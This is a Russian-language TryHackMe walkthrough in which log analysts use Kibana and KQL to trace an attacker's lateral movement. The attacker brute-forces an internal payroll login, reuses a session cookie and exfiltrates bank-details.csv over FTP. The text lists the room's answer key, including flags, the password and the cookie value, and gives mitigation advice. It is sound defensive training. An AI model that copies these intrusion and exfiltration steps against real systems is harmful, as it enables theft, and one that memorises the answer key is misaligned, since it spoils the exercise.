```commandline
backdoor
```
Какой флаг отправляется через запросы cURL  на сервер evilparrot.thm ?
```commandline
THM{C4N_y0U_h34r_m3}
```
Как называется значение реестра, добавленное злоумышленником?
```commandline
BackdoorShell
```

## Задание 10
Боковое движение

В контексте MITRE ATT&CK « боковое перемещение » относится к приемам и методам, используемым злоумышленниками для перемещения по нескольким системам и учетным записям и исследования сети с целью получения доступа к своей цели.

Получив начальный доступ к рабочей станции, злоумышленник может использовать методы бокового перемещения для исследования сети и поиска других систем для компрометации. Это может включать использование уязвимостей или слабых мест в сетевых протоколах или программном обеспечении, использование украденных учетных данных, передачу хэшей или перехват существующих сеансов для перехода из одной системы в другую.

Перечисление сетей

Первую любопытную запись журнала, которая позволяет предположить, что злоумышленник готовится к боковому движению, можно найти в четвертом событии журнала в нашем текущем фильтре:

Событие журнала, указывающее на использование команды ping

ping payroll.servidae.internal

Команда "ping" — это стандартный сетевой инструмент, используемый для проверки связи между двумя устройствами в сети через протокол ICMP. Это не указывает на боковое перемещение или вредоносную активность; однако более обширная картина подозрительной активности, которую мы обнаружили в журналах, подтверждает идею о том, что злоумышленник пытается проверить связь с другими внутренними ресурсами.

Поскольку Билл — финансовый директор, мы можем сделать вывод, что сайт payroll.servidae.internal — это внутренний инструмент расчета заработной платы, используемый Servidae. Если злоумышленнику удастся использовать скомпрометированную рабочую станцию ​​Билла для поворота и получения доступа к внутренней системе расчета заработной платы, последствия утечки данных и фальсификации могут быть пагубными.

Боковое движение: внутренние ресурсы

Чтобы исследовать глубже, давайте сбросим наш временной диапазон на тот, который был изначально, но изменим начальную дату на 11 мая 2023 г. @ 18:57:30.000 . Таким образом, мы увидим только оставшиеся захваченные журналы.

Панель даты и времени в Кибане, на которой выделены начальная дата и время 11 мая 2023 г. в 18:57:30.000

Сразу после обновления временной шкалы мы начинаем видеть несколько журналов, пытающихся выполнить запросы cURL к веб-сайту payroll.servidae.internal по http://payroll.servidae.internalURL-адресу:

События журнала, указывающие на непрерывный запуск команд curl на веб-сервере расчета заработной платы с возрастающими попытками ввода пароля

Чтобы отфильтровать ненужные повторяющиеся журналы ( например, команды cURL-маяка ), добавим к нашим результатам следующий запрос KQL :

process.name : "curl.exe" AND NOT process.command_line : *beacon*

Поле поиска KQL

Помимо фильтрации результатов, этот KQL- запрос демонстрирует, что:

Мы можем объединить несколько утверждений, используя операторы И + ИЛИ .
Мы можем использовать подстановочные знаки « * » для сопоставления полей, содержащих значения, а не для  их равенства .
Мы можем исключить определенные результаты, используя « НЕ » — в этом случае мы исключаем любой результат командной строки, содержащий слово «маяк».
Внутренний серверный брут-форс

После добавления указанного выше запроса KQL к нашим результатам мы теперь получаем более ясную картину того, что злоумышленник пытался сделать, чтобы получить доступ к внутреннему сайту заработной платы. Похоже, что злоумышленник провел атаку методом подбора , поскольку в журналах показан длинный список POSTзапросов, сделанных на сервер. Параметры запроса указывают на то, что злоумышленник пытается отправить форму входа ( submit=submit), используя учетную запись пользователя "bsmith" ( username=bsmith).

Каждое событие журнала показывает, что злоумышленник увеличивает количество попыток ввода пароля ( password=Pass3, password=Pass4, password=Pass5, и т. д.), что является явным признаком атаки методом подбора.

К счастью, нам не придется прочесывать каждую попытку, чтобы определить, был ли какой-либо успешный доступ, поскольку мы получили дополнительную информацию от команды разработчиков о том, что внутренний сайт по расчету заработной платы отвечает сеансовым cookie с именем " PHPSESSID " для любого успешного входа. Любой последующий запрос к серверу расчета заработной платы должен включать этот cookie, чтобы оставаться в системе. Вооружившись этими знаниями, мы можем создать простой запрос KQL для возврата событий журнала, содержащих этот cookie в запросе:

*PHPSESSID*

Фильтрация с помощью этого запроса должна вернуть два успешных входа от злоумышленника:

Поле поиска KQL, в котором выделен запрос *PHPSESSID*

Внутренняя утечка данных сервера

Теперь, когда мы знаем, что злоумышленник взломал внутренний сайт по расчету заработной платы как пользователь Билла Смита (bsmith), нам нужно определить, к каким каталогам или файлам он мог получить доступ на этом веб-сервере после аутентификации.

Обычно мы могли бы использовать дополнительные журналы, собранные с сервера nginx  , на котором размещен внутренний сайт по заработной плате. Это дало бы нам гораздо больше подробностей о каждом HTTP-запросе, параметре и источнике; однако этот подход выходит за рамки этой комнаты, и мы будем придерживаться событий журнала агента рабочей станции.

В нашем случае воспользуемся следующим KQL- запросом :

process.name: "curl.exe" AND NOT process.command_line: *beacon* AND process.command_line: *http\://payroll.servidae.internal/*

По сути, это тот же запрос, который мы использовали выше, но с дополнительным оператором AND , чтобы возвращать только те события журнала, когда злоумышленник получал доступ к каталогу в корневом каталоге веб-сервера (используя подстановочный знак * после обратной косой черты / ).

Это вернет три релевантных результата. Первые два результата показывают, что злоумышленник получает доступ к веб-странице /employee-payroll.php , которая, вероятно, содержит конфиденциальную внутреннюю информацию, предназначенную только для финансового отдела.

Событие журнала, указывающее на то, что злоумышленник получил доступ к веб-странице /employee-payroll.php на веб-сервере расчета заработной платы.

Окончательный результат в наших журналах показывает, что злоумышленник загрузил потенциально конфиденциальный CSV-файл после получения доступа к серверу заработной платы. Он был сохранен на рабочем столе Билла, за которым, если исследовать его в хронологическом порядке без текущих фильтров, сразу следует команда " FTP " ( File Transfer Protocol ), которая, скорее всего, извлечет и передаст украденный документ обратно в систему злоумышленника.

Событие журнала, отражающее загрузку злоумышленником файла с сервера расчетов заработной платы под названием bank-details.csv

Смягчение

Вышеприведенный анализ заключает, что, получив контроль над рабочей станцией Билла, злоумышленник может провести дальнейший подсчет, используя доступ и сеть рабочей станции, чтобы определить внутренний ресурс, уязвимый для атаки методом подбора. Используя прокси-сервер через рабочую станцию ​​Билла, злоумышленник может получить доступ к внутреннему ресурсу и перенести конфиденциальные документы в систему злоумышленника.

Существует несколько концепций защиты, направленных на ограничение возможности злоумышленника свободно перемещаться по сети, например, сегментация сети , строгий контроль доступа и принципы Zero Trust . Традиционные модели безопасности основывались на предположении, что угрозы являются внешними и что, оказавшись внутри сети, пользователи и устройства могут быть доверенными. Однако этот подход оказался неэффективным с ростом внутренних угроз. С другой стороны, «Zero Trust» непрерывно аутентифицирует и авторизует пользователей, устройства и приложения перед предоставлением доступа к ресурсам.

### Ответьте на вопросы ниже
Какой пароль использовал злоумышленник для доступа к учетной записи Билла на внутреннем сайте по расчету заработной платы?
```commandline
Password123!
```
Какой флаг был включен в HTTP-запросы во время успешных входов злоумышленника?
```commandline
THM{1m_1N_Y0ur_P4YR0LL}
```
Какое значение сеансового cookie-файла злоумышленник включил в запрос cURL в 18:58:08.001 ?
```commandline
dt5qhq423goknmq269rg1tal1a
```
Как называется конфиденциальный файл, загруженный злоумышленником?
```commandline
bank-details.csv
```

## Задание 11
Заключение

Подводя итоги нашего анализа, мы выявили несколько индикаторов компрометации рабочей станции Билла. Мы сопоставили 
несколько из этих событий журнала с распространенными тактиками и приемами, применяемыми субъектами угроз. Благодаря 
всестороннему исследованию функций поиска и фильтрации в Kibana мы успешно расшифровали действия, выполняемые 
злоумышленником на скомпрометированной системе.

Мы получили практическое представление о тактике и методах злоумышленников и расширили наше понимание реальных 
сценариев инцидентов кибербезопасности . Это упражнение подчеркнуло важность анализа журналов и его роль в 
обнаружении и смягчении инцидентов безопасности, усилив важность постоянного мониторинга и анализа данных журналов 
для укрепления нашей защиты от злоумышленников.

Следующие шаги

После завершения анализа журнала и получения ценных сведений о действиях злоумышленника важно подчеркнуть, что фаза 
анализа является лишь одним из компонентов более широкого процесса реагирования на инциденты. Как правило, 
оставшийся процесс реагирования на инциденты включает в себя дополнительные важные шаги , которые выходят за рамки 
этой комнаты, но не менее важны:
- Сдерживание : изоляция затронутой системы или сегмента сети для предотвращения дальнейшего ущерба.
- Ликвидация : удаление вредоносного ПО из скомпрометированной системы.
- Восстановление : восстановление системы или сети до нормального рабочего состояния.
- Действия после инцидента : оценка инцидента, выявление основных причин, документирование извлеченных уроков и 
  внедрение мер по улучшению безопасности.
- Руководство по обработке инцидентов компьютерной безопасности, разработанное NIST (Национальным институтом 
  стандартов и технологий), представляет собой великолепный источник подробных рекомендаций и передового опыта для 
  эффективного реагирования на инциденты компьютерной безопасности.

Дальнейшие исследования

elastic.co/elastic-stack : официальный сайт Elastic Stack.
Справочник по полям ECS : Справочник по полям ECS (Elastic Common Schema).
attack.mitre.org : Официальный сайт фреймворка MITRE ATT&CK.

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)